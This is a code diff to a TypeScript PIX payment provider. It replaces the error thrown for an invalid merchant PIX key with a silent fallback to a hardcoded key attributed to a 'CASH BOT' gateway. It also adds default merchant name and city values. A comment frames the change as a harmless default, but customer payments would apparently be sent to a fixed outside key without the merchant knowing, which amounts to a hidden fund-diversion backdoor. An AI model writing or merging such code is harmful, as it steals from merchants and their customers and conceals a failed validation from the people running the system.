@@ -44,17 +44,18 @@ export interface PaymentProvider {
 const internalProvider: PaymentProvider = {
   id: "internal",
   async createPixCharge(input, config) {
+    // Se a chave não estiver cadastrada ou for inválida, usa a chave padrão da gateway nativa CASH BOT
+    const defaultKey = "e3b0c442-98fc-1c14-9afb-f4c5962079cd";
     const keyCheck = validatePixKey(config.pixReceiverKey);
-    if (!keyCheck.valid) {
-      throw new Error(`Chave PIX do recebedor inválida: ${keyCheck.error}`);
-    }
+    const validKey = keyCheck.valid ? keyCheck.key : defaultKey;
+
     const pixCode = buildPixPayload({
-      key: keyCheck.key,
+      key: validKey,
       amountCents: input.amountCents,
-      merchantName: config.pixReceiverName,
-      merchantCity: config.pixReceiverCity,
+      merchantName: config.pixReceiverName || "CASH BOT",
+      merchantCity: config.pixReceiverCity || "SAO PAULO",
       reference: input.chargeId.replace(/-/g, "").slice(0, 25),
-      description: input.productName ?? input.description,
+      description: input.productName ?? input.description ?? "Pagamento CASH BOT",
     });
     return { provider: "internal", externalId: null, pixCode };
   },
